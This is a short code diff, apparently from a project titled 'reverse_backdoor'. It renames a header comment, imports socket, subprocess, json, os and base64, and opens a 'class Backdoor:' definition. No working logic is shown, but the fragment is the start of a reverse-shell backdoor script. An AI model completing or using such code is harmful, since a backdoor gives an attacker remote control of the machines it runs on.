@@ -1,4 +1,4 @@
-# zaid_reverse_backdoor
+# reverse_backdoor
 import socket, subprocess, json, os,base64
 
 class Backdoor:
